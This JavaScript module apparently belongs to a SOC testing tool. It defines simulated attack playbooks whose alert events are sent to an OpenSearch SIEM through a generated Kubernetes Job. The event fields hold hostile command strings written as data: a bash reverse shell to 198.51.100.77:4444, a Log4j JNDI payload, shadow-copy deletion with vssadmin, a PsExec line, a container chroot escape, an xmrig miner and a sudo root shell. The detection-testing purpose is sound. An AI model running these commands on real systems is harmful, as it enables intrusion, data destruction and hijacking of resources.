import fs from 'node:fs/promises';
import fsSync from 'node:fs';
import path from 'node:path';
import { load as yamlLoad, dump as yamlDump } from 'js-yaml';
import { execa } from 'execa';
import { logger } from '../utils/logger.js';
import { execStream, exec } from '../utils/exec.js';
import { getVigilantePlaybooksDir, loadConfig } from './config.js';
import { NIST_ATTACK_VECTORS } from './nist.js';

/**
 * Built-in standard threat simulation playbooks representing major MITRE ATT&CK & NIST SP 800-61 categories
 */
export const BUILTIN_PLAYBOOKS = [
  {
    id: 'recon-sweep',
    name: 'Network Reconnaissance & Port Scan Sweep',
    category: 'reconnaissance',
    nistVector: 'OTHER',
    signType: 'PRECURSOR',
    severity: 'MEDIUM',
    author: 'Vigilante Threat Research',
    description: 'Simulates active network service discovery, horizontal TCP SYN scanning, and OS banner probing across the subnet.',
    mitreTechniques: [
      { id: 'T1595.001', name: 'Active Scanning: Scanning IP Blocks', tactic: 'Reconnaissance' },
      { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' }
    ],
    tags: ['recon', 'nmap', 'port-scan', 'discovery', 'precursor'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'port_scan_syn_flood',
        severity: 6,
        source: { ip: '198.51.100.45', port: 49152, geo: { country_name: 'External Threat Actor' } },
        destination: { ip: '10.0.0.15', port: 445 },
        network: { transport: 'tcp', protocol: 'smb', direction: 'inbound', bytes: 1420 },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1046', name: 'Network Service Discovery' } },
        message: 'Horizontal port scan activity detected from 198.51.100.45 targeting ports 22, 80, 443, 445, 3389, 8080'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'stealth_fin_scan',
        severity: 5,
        source: { ip: '198.51.100.45', port: 49153 },
        destination: { ip: '10.0.0.18', port: 22 },
        network: { transport: 'tcp', protocol: 'ssh', direction: 'inbound', bytes: 48 },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1595.001', name: 'Active Scanning: Scanning IP Blocks' } },
        message: 'Stealth TCP FIN / Null packet scan detected targeting SSH endpoints'
      },
      {
        timestampOffsetSec: 2,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'os_fingerprinting_probe',
        severity: 4,
        source: { ip: '198.51.100.45', port: 49154 },
        destination: { ip: '10.0.0.25', port: 80 },
        network: { transport: 'tcp', protocol: 'http', direction: 'inbound' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1046', name: 'Network Service Discovery' } },
        message: 'Active OS fingerprinting and TCP window size probe probe against web tier'
      }
    ]
  },
  {
    id: 'credential-bruteforce',
    name: 'High-Velocity SSH & RDP Credential Brute Force',
    category: 'credential-access',
    nistVector: 'ATTRITION',
    signType: 'INDICATOR',
    severity: 'HIGH',
    author: 'Vigilante Threat Research',
    description: 'Simulates automated password spraying and high-frequency authentication failure bursts against SSH and RDP management services.',
    mitreTechniques: [
      { id: 'T1110.001', name: 'Brute Force: Password Guessing', tactic: 'Credential Access' },
      { id: 'T1110.003', name: 'Brute Force: Password Spraying', tactic: 'Credential Access' }
    ],
    tags: ['ssh', 'rdp', 'brute-force', 'auth-failure', 'passwords', 'attrition'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'authentication',
        action: 'ssh_bruteforce_failure',
        severity: 8,
        source: { ip: '203.0.113.88', port: 52140 },
        destination: { ip: '10.0.0.20', port: 22 },
        network: { transport: 'tcp', protocol: 'ssh' },
        user: { name: 'root' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1110.001', name: 'Password Guessing' } },
        message: 'Repeated SSH authentication failure (25 attempts/10s) for user root from 203.0.113.88'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'authentication',
        action: 'password_spray_burst',
        severity: 8,
        source: { ip: '203.0.113.88', port: 52145 },
        destination: { ip: '10.0.0.22', port: 22 },
        network: { transport: 'tcp', protocol: 'ssh' },
        user: { name: 'admin' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1110.003', name: 'Password Spraying' } },
        message: 'Multi-account password spray detected against admin, deploy, service-account, ubuntu'
      },
      {
        timestampOffsetSec: 2,
        eventKind: 'alert',
        eventCategory: 'authentication',
        action: 'rdp_lockout_threshold',
        severity: 7,
        source: { ip: '203.0.113.92', port: 44321 },
        destination: { ip: '10.0.0.30', port: 3389 },
        network: { transport: 'tcp', protocol: 'rdp' },
        user: { name: 'administrator' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1110', name: 'Brute Force' } },
        message: 'Account lockout threshold exceeded for administrator via RDP endpoint'
      }
    ]
  },
  {
    id: 'dns-tunneling-exfil',
    name: 'C2 DNS Tunneling & High-Entropy Data Exfiltration',
    category: 'exfiltration',
    nistVector: 'IMPROPER_USAGE',
    signType: 'INDICATOR',
    severity: 'CRITICAL',
    author: 'Vigilante Threat Research',
    description: 'Simulates covert command-and-control communication and encoded data exfiltration concealed within anomalous DNS TXT/NULL queries.',
    mitreTechniques: [
      { id: 'T1071.004', name: 'Application Layer Protocol: DNS', tactic: 'Command and Control' },
      { id: 'T1048.003', name: 'Exfiltration Over Unencrypted Non-C2 Protocol', tactic: 'Exfiltration' }
    ],
    tags: ['dns', 'tunneling', 'c2', 'data-exfil', 'covert-channel'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'dns',
        action: 'dns_high_entropy_query',
        severity: 9,
        source: { ip: '10.0.0.52', port: 58392 },
        destination: { ip: '1.1.1.1', port: 53 },
        network: { transport: 'udp', protocol: 'dns', direction: 'outbound' },
        dns: {
          question: { name: 'dGhpcy1pcy1hbi1leGZpbHRyYXRpb24tdGVzdC1wYXlsb2Fk.c2.attacker-c2.net', type: 'TXT' },
          response_code: 'NOERROR'
        },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1071.004', name: 'DNS Application Layer Protocol' } },
        message: 'High entropy DNS query detected (Entropy: 4.82, Length: 64 chars) indicating DNS tunneling'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'dns',
        action: 'dns_c2_heartbeat',
        severity: 8,
        source: { ip: '10.0.0.52', port: 58394 },
        destination: { ip: '8.8.8.8', port: 53 },
        network: { transport: 'udp', protocol: 'dns', direction: 'outbound' },
        dns: {
          question: { name: 'beacon-chk-00912.c2.attacker-c2.net', type: 'A' },
          resolved_ip: '198.51.100.99'
        },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1071.004', name: 'DNS Application Layer Protocol' } },
        message: 'Periodic C2 beaconing pattern detected communicating with unknown domain c2.attacker-c2.net'
      },
      {
        timestampOffsetSec: 2,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'dns_data_exfil_chunk',
        severity: 9,
        source: { ip: '10.0.0.52', port: 58399 },
        destination: { ip: '198.51.100.99', port: 53 },
        network: { transport: 'udp', protocol: 'dns', bytes: 18450 },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1048.003', name: 'Exfiltration Over DNS' } },
        message: 'Large volume of DNS TXT records transferred (18.4 KB) over short time window'
      }
    ]
  },
  {
    id: 'ransomware-lateral',
    name: 'Ransomware Infiltration & Lateral SMB Spread',
    category: 'impact',
    nistVector: 'IMPROPER_USAGE',
    signType: 'INDICATOR',
    severity: 'CRITICAL',
    author: 'Vigilante Threat Research',
    description: 'Simulates ransomware lateral movement via SMB PsExec, Volume Shadow Copy destruction (vssadmin), and mass file encryption indicators.',
    mitreTechniques: [
      { id: 'T1021.002', name: 'Remote Services: SMB/Windows Admin Shares', tactic: 'Lateral Movement' },
      { id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
      { id: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' }
    ],
    tags: ['ransomware', 'smb', 'psexec', 'shadow-copies', 'encryption'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'smb_psexec_lateral_spread',
        severity: 9,
        source: { ip: '10.0.0.12', port: 49821 },
        destination: { ip: '10.0.0.15', port: 445 },
        network: { transport: 'tcp', protocol: 'smb' },
        process: { name: 'psexesvc.exe', command_line: 'psexec \\\\10.0.0.15 -u admin -p **** cmd.exe' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1021.002', name: 'SMB/Windows Admin Shares' } },
        message: 'Suspicious remote service creation (PsExec) detected over SMB share ADMIN$'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'process',
        action: 'vssadmin_shadow_deletion',
        severity: 10,
        source: { ip: '10.0.0.15' },
        process: { name: 'vssadmin.exe', command_line: 'vssadmin.exe delete shadows /all /quiet' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1490', name: 'Inhibit System Recovery' } },
        message: 'CRITICAL: Volume Shadow Copy deletion attempted via vssadmin.exe to prevent system restore'
      },
      {
        timestampOffsetSec: 2,
        eventKind: 'alert',
        eventCategory: 'file',
        action: 'mass_file_modification_ransom',
        severity: 10,
        source: { ip: '10.0.0.15' },
        file: { path: '/var/data/finance/reports.locked', extension: 'locked' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1486', name: 'Data Encrypted for Impact' } },
        message: 'High frequency file modification and rename burst (>500 files/sec with extension .locked)'
      }
    ]
  },
  {
    id: 'k8s-pod-escape',
    name: 'Kubernetes Compromised Pod & Host Escape',
    category: 'privilege-escalation',
    nistVector: 'IMPROPER_USAGE',
    signType: 'INDICATOR',
    severity: 'CRITICAL',
    author: 'Vigilante Threat Research',
    description: 'Simulates token theft from a compromised pod, API authorization abuse, container host filesystem breakout, and cryptominer spawning.',
    mitreTechniques: [
      { id: 'T1611', name: 'Escape to Host', tactic: 'Privilege Escalation' },
      { id: 'T1609', name: 'Container Administration Command', tactic: 'Execution' },
      { id: 'T1613', name: 'Container and Resource Discovery', tactic: 'Discovery' },
      { id: 'T1496', name: 'Resource Hijacking', tactic: 'Impact' }
    ],
    tags: ['k8s', 'container-escape', 'cryptominer', 'chroot', 'cloud-native'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'authentication',
        action: 'k8s_service_account_token_theft',
        severity: 8,
        source: { ip: '10.42.0.15' },
        destination: { ip: '10.43.0.1', port: 443 },
        user: { name: 'system:serviceaccount:default:default' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1613', name: 'Container and Resource Discovery' } },
        message: 'Default service account attempting broad cluster-admin API queries across namespaces'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'process',
        action: 'k8s_host_mount_access',
        severity: 10,
        source: { ip: '10.42.0.15' },
        process: { name: 'chroot', command_line: 'chroot /host /bin/bash' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1611', name: 'Escape to Host' } },
        message: 'CRITICAL: Container attempted chroot into host root filesystem (/host) for node takeover'
      },
      {
        timestampOffsetSec: 2,
        eventKind: 'alert',
        eventCategory: 'process',
        action: 'k8s_cryptominer_spawned',
        severity: 8,
        source: { ip: '10.42.0.15' },
        process: { name: 'xmrig', command_line: './xmrig -o stratum+tcp://pool.monero.org:3333' },
        network: { transport: 'tcp', protocol: 'stratum', port: 3333 },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1496', name: 'Resource Hijacking' } },
        message: 'Unauthorized cryptomining process (xmrig) detected communicating with mining pool'
      }
    ]
  },
  {
    id: 'web-cve-rce',
    name: 'Web Application Exploitation & Reverse Shell RCE',
    category: 'initial-access',
    nistVector: 'WEB_APPLICATION',
    signType: 'INDICATOR',
    severity: 'HIGH',
    author: 'Vigilante Threat Research',
    description: 'Simulates an unauthenticated Remote Code Execution attack against a public web application spawning an interactive reverse shell.',
    mitreTechniques: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1059.004', name: 'Command and Scripting Interpreter: Unix Shell', tactic: 'Execution' }
    ],
    tags: ['web', 'cve', 'rce', 'reverse-shell', 'log4j', 'jndi'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'jndi_log4j_exploit_payload',
        severity: 9,
        source: { ip: '198.51.100.77', port: 41230 },
        destination: { ip: '10.0.0.10', port: 8080 },
        network: { transport: 'tcp', protocol: 'http' },
        http: { request: { method: 'POST', body: '${jndi:ldap://198.51.100.77:1389/Exploit}' } },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1190', name: 'Exploit Public-Facing Application' } },
        message: 'JNDI injection / Log4j string payload detected in HTTP User-Agent header'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'process',
        action: 'interactive_reverse_shell_spawned',
        severity: 10,
        source: { ip: '10.0.0.10' },
        destination: { ip: '198.51.100.77', port: 4444 },
        process: { name: 'bash', command_line: '/bin/bash -i >& /dev/tcp/198.51.100.77/4444 0>&1' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1059.004', name: 'Unix Shell' } },
        message: 'CRITICAL: Interactive outbound reverse shell spawned by web server worker process (UID 1000)'
      }
    ]
  },
  {
    id: 'arp-poison-mitm',
    name: 'ARP Gateway Poisoning & Man-In-The-Middle',
    category: 'defense-evasion',
    nistVector: 'IMPERSONATION',
    signType: 'INDICATOR',
    severity: 'HIGH',
    author: 'Vigilante Threat Research',
    description: 'Simulates ARP cache poisoning flooding gratuitous ARP responses to re-route subnet traffic through an unauthorized attacker node.',
    mitreTechniques: [
      { id: 'T1557.002', name: 'Adversary-in-the-Middle: ARP Poisoning', tactic: 'Credential Access' },
      { id: 'T1040', name: 'Network Sniffing', tactic: 'Credential Access' }
    ],
    tags: ['arp', 'mitm', 'arp-spoof', 'layer2', 'gateway-spoof'],
    events: [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'gratuitous_arp_flood',
        severity: 8,
        source: { ip: '10.0.0.99', mac: '02:42:0a:00:00:99' },
        destination: { ip: '10.0.0.1', mac: 'ff:ff:ff:ff:ff:ff' },
        network: { protocol: 'arp' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1557.002', name: 'ARP Poisoning' } },
        message: 'Gratuitous ARP broadcast burst (50 pkts/s) claiming ownership of Default Gateway (10.0.0.1)'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'arp_duplicate_ip_conflict',
        severity: 7,
        source: { ip: '10.0.0.99' },
        destination: { ip: '10.0.0.1' },
        network: { protocol: 'arp' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1557.002', name: 'ARP Poisoning' } },
        message: 'Duplicate IP address conflict detected for gateway 10.0.0.1 (MAC collision)'
      }
    ]
  }
];

/**
 * Validate a threat playbook object
 * @param {Object} playbook
 * @returns {{ valid: boolean, errors: string[] }}
 */
export function validatePlaybook(playbook) {
  const errors = [];
  if (!playbook || typeof playbook !== 'object') {
    return { valid: false, errors: ['Playbook must be a valid JSON/YAML object.'] };
  }

  if (!playbook.id || typeof playbook.id !== 'string') {
    errors.push('Missing or invalid "id" property.');
  }
  if (!playbook.name || typeof playbook.name !== 'string') {
    errors.push('Missing or invalid "name" property.');
  }
  if (!Array.isArray(playbook.events) || playbook.events.length === 0) {
    errors.push('Playbook must contain an "events" array with at least 1 simulated event.');
  } else {
    playbook.events.forEach((ev, idx) => {
      if (!ev.message && !ev.action) {
        errors.push(`Event [${idx}] must contain a "message" or "action" property.`);
      }
    });
  }

  return {
    valid: errors.length === 0,
    errors
  };
}

/**
 * Load all available playbooks (built-in + custom user playbooks from XDG and workspace)
 * @param {Object} [options]
 * @param {string} [options.customDir]
 * @returns {Promise<Array<Object>>}
 */
export async function listAvailablePlaybooks(options = {}) {
  const playbooks = [...BUILTIN_PLAYBOOKS.map(p => ({ ...p, isBuiltin: true }))];

  const searchDirs = [
    getVigilantePlaybooksDir(),
    path.join(process.cwd(), 'playbooks'),
    path.join(process.cwd(), 'config', 'playbooks')
  ];

  if (options.customDir) {
    searchDirs.unshift(options.customDir);
  }

  const seenIds = new Set(playbooks.map(p => p.id));

  for (const dir of searchDirs) {
    if (!fsSync.existsSync(dir)) continue;

    try {
      const files = await fs.readdir(dir);
      for (const file of files) {
        if (file.endsWith('.yaml') || file.endsWith('.yml') || file.endsWith('.json')) {
          const fullPath = path.join(dir, file);
          try {
            const rawContent = await fs.readFile(fullPath, 'utf8');
            const parsed = file.endsWith('.json') ? JSON.parse(rawContent) : yamlLoad(rawContent);

            const validation = validatePlaybook(parsed);
            if (validation.valid) {
              const playbookId = parsed.id || path.basename(file, path.extname(file));
              if (seenIds.has(playbookId)) {
                // Override built-in or earlier playbook
                const existingIdx = playbooks.findIndex(p => p.id === playbookId);
                if (existingIdx >= 0) {
                  playbooks[existingIdx] = {
                    ...parsed,
                    id: playbookId,
                    filePath: fullPath,
                    isBuiltin: false,
                    isCustom: true
                  };
                }
              } else {
                seenIds.add(playbookId);
                playbooks.push({
                  ...parsed,
                  id: playbookId,
                  filePath: fullPath,
                  isBuiltin: false,
                  isCustom: true
                });
              }
            } else {
              logger.warn('THREAT:PLAYBOOK:INVALID', `Invalid playbook at ${fullPath}: ${validation.errors.join(', ')}`);
            }
          } catch (err) {
            logger.warn('THREAT:PLAYBOOK:PARSE_ERR', `Failed to parse ${fullPath}: ${err.message}`);
          }
        }
      }
    } catch {
      // Ignore unreadable directory
    }
  }

  return playbooks;
}

/**
 * Load a specific playbook by ID or file path
 * @param {string} idOrPath
 * @param {Object} [options]
 * @returns {Promise<Object>}
 */
export async function loadPlaybook(idOrPath, options = {}) {
  if (!idOrPath) {
    throw new Error('Playbook ID or file path must be specified.');
  }

  // Check if it is a direct file path
  if (fsSync.existsSync(idOrPath)) {
    const rawContent = await fs.readFile(idOrPath, 'utf8');
    const parsed = idOrPath.endsWith('.json') ? JSON.parse(rawContent) : yamlLoad(rawContent);
    const validation = validatePlaybook(parsed);
    if (!validation.valid) {
      throw new Error(`Invalid custom playbook: ${validation.errors.join('; ')}`);
    }
    return {
      ...parsed,
      filePath: idOrPath,
      isCustom: true
    };
  }

  // Search all available playbooks
  const all = await listAvailablePlaybooks(options);
  const found = all.find(p => p.id === idOrPath || p.name.toLowerCase() === idOrPath.toLowerCase());
  if (!found) {
    throw new Error(`Playbook '${idOrPath}' not found. Available: ${all.map(p => p.id).join(', ')}`);
  }

  return found;
}

/**
 * Generate a dynamic Kubernetes Job manifest for injecting playbook events into OpenSearch SIEM
 * @param {Object} playbook
 * @param {Object} [options]
 * @returns {string} Kubernetes YAML manifest
 */
export function generateThreatJobManifest(playbook, options = {}) {
  const namespace = options.namespace || 'opensearch';
  const jobName = `threat-sim-${playbook.id.toLowerCase().replace(/[^a-z0-9-]/g, '-')}`.slice(0, 50);
  const osUrl = options.osUrl || `http://opensearch-cluster-master.${namespace}.svc.cluster.local:9200`;

  // Build curl POST commands for all events
  const curlCommands = (playbook.events || []).map((ev, idx) => {
    const enrichedEvent = {
      '@timestamp': '$(date -u +"%Y-%m-%dT%H:%M:%SZ")',
      scenario: {
        id: playbook.id,
        name: playbook.name,
        category: playbook.category || 'attack-simulation'
      },
      ...ev
    };

    const jsonPayload = JSON.stringify(enrichedEvent, null, 2);
    return `# Event ${idx + 1}: ${ev.action || ev.message || 'Threat Event'}
curl -s -X POST "${osUrl}/vigilante-network-events/_doc" \\
  -H 'Content-Type: application/json' \\
  -d '${jsonPayload.replace(/'/g, "'\\''")}'
`;
  }).join('\n');

  return `apiVersion: batch/v1
kind: Job
metadata:
  name: ${jobName}
  namespace: ${namespace}
  labels:
    app.kubernetes.io/part-of: vigilante
    vigilante.io/module: opensearch
    vigilante.io/playbook: ${playbook.id}
spec:
  ttlSecondsAfterFinished: 300
  template:
    metadata:
      name: ${jobName}
    spec:
      restartPolicy: OnFailure
      containers:
      - name: injector
        image: curlimages/curl:8.5.0
        command: ["/bin/sh", "-c"]
        args:
        - |
          set -e
          echo "⚡ Injecting Threat Scenario '${playbook.name}' (${playbook.id}) into OpenSearch at ${osUrl}..."
          
${curlCommands}
          
          echo "✔ Threat simulation '${playbook.id}' completed successfully (${playbook.events?.length || 0} events ingested)!"
`;
}

/**
 * Execute a threat simulation playbook against the target cluster & OpenSearch namespace
 * @param {Object} options
 * @param {string|Object} options.playbook - Playbook ID, file path, or playbook object
 * @param {string} [options.namespace='opensearch']
 * @param {string} [options.clusterName='vigilante-dev']
 * @param {Function} [options.onLog]
 * @returns {Promise<{ success: boolean, playbook: Object, eventsCount: number, namespace: string }>}
 */
export async function executeThreatPlaybook({
  playbook,
  namespace = 'opensearch',
  clusterName = 'vigilante-dev',
  onLog = null,
  customDir = null
}) {
  const targetPlaybook = typeof playbook === 'object' ? playbook : await loadPlaybook(playbook, { customDir });
  const targetNamespace = namespace || 'opensearch';

  if (onLog) {
    onLog(`🎯 [threat-sim] Preparing Scenario: ${targetPlaybook.name} [Severity: ${targetPlaybook.severity || 'HIGH'}]`);
    onLog(`📡 [threat-sim] MITRE ATT&CK Techniques: ${(targetPlaybook.mitreTechniques || []).map(t => t.id).join(', ') || 'N/A'}`);
    onLog(`📊 [threat-sim] Total simulated threat events: ${targetPlaybook.events?.length || 0}`);
  }

  // Generate dynamic Kubernetes Job manifest
  const jobManifest = generateThreatJobManifest(targetPlaybook, { namespace: targetNamespace });
  const tempManifestPath = path.join('/tmp', `vigilante-threat-job-${Date.now()}-${targetPlaybook.id}.yaml`);
  await fs.writeFile(tempManifestPath, jobManifest, 'utf8');

  try {
    // Delete existing job if already present
    const jobName = `threat-sim-${targetPlaybook.id.toLowerCase().replace(/[^a-z0-9-]/g, '-')}`.slice(0, 50);
    try {
      await execa('kubectl', ['delete', 'job', jobName, '-n', targetNamespace, '--ignore-not-found=true']);
    } catch {
      // Ignore
    }

    if (onLog) onLog(`[threat-sim] Applying simulation Job '${jobName}' to namespace '${targetNamespace}'...`);
    await execa('kubectl', ['apply', '-f', tempManifestPath, '-n', targetNamespace]);

    if (onLog) {
      onLog(`✔ [threat-sim] Simulation Job launched successfully in namespace '${targetNamespace}'!`);
      onLog(`🔍 [threat-sim] OpenSearch Index target: 'vigilante-network-events'`);
      (targetPlaybook.events || []).forEach((ev, idx) => {
        onLog(`  • Event [${idx + 1}]: ${ev.action || 'event'} -> ${ev.message || ''}`);
      });
    }

    return {
      success: true,
      playbook: targetPlaybook,
      eventsCount: targetPlaybook.events?.length || 0,
      namespace: targetNamespace
    };
  } finally {
    await fs.unlink(tempManifestPath).catch(() => {});
  }
}

/**
 * Create a sample custom playbook template YAML file in XDG playbooks directory
 * @param {string} playbookName
 * @param {Object} [overrides]
 * @returns {Promise<{ filePath: string, content: string }>}
 */
export async function createCustomPlaybookTemplate(playbookName = 'custom-zero-day', overrides = {}) {
  const playbooksDir = getVigilantePlaybooksDir();
  await fs.mkdir(playbooksDir, { recursive: true });

  const safeId = (playbookName || 'custom-scenario').toLowerCase().replace(/[^a-z0-9_-]/g, '-');
  const filename = `${safeId}.yaml`;
  const filePath = path.join(playbooksDir, filename);

  const samplePlaybook = {
    id: safeId,
    name: overrides.name || 'Custom Incident Response Simulation Scenario',
    category: overrides.category || 'initial-access',
    nistVector: overrides.nistVector || 'WEB_APPLICATION',
    signType: overrides.signType || 'INDICATOR',
    severity: overrides.severity || 'HIGH',
    author: overrides.author || 'Security Operator',
    description: overrides.description || 'Custom security playbook simulating targeted intrusion vectors for SOC detection verification.',
    mitreTechniques: overrides.mitreTechniques || [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1059', name: 'Command and Scripting Interpreter', tactic: 'Execution' }
    ],
    tags: overrides.tags || ['custom', 'soc-test', 'zero-day'],
    events: overrides.events || [
      {
        timestampOffsetSec: 0,
        eventKind: 'alert',
        eventCategory: 'network',
        action: 'custom_ingress_probe',
        severity: 7,
        source: { ip: '198.51.100.200', port: 51234 },
        destination: { ip: '10.0.0.10', port: 443 },
        network: { transport: 'tcp', protocol: 'https' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1190', name: 'Exploit Public-Facing Application' } },
        message: 'Suspicious payload delivered to HTTPS ingress endpoint'
      },
      {
        timestampOffsetSec: 1,
        eventKind: 'alert',
        eventCategory: 'process',
        action: 'privilege_escalation_attempt',
        severity: 9,
        source: { ip: '10.0.0.10' },
        process: { name: 'sudo', command_line: 'sudo -u#0 /bin/sh' },
        threat: { framework: 'MITRE ATT&CK', technique: { id: 'T1068', name: 'Exploitation for Privilege Escalation' } },
        message: 'Local privilege escalation attempt detected via sudo vulnerability CVE-2021-3156'
      }
    ]
  };

  const yamlContent = `# 🛡️ Vigilante Modular Threat Simulation Playbook
# Place YAML or JSON playbooks in $XDG_CONFIG_HOME/vigilante/playbooks/ or ./playbooks/
${yamlDump(samplePlaybook, { indent: 2 })}`;

  await fs.writeFile(filePath, yamlContent, 'utf8');
  logger.info('THREAT:PLAYBOOK:TEMPLATE', `Created custom playbook template at ${filePath}`);

  return {
    filePath,
    content: yamlContent
  };
}
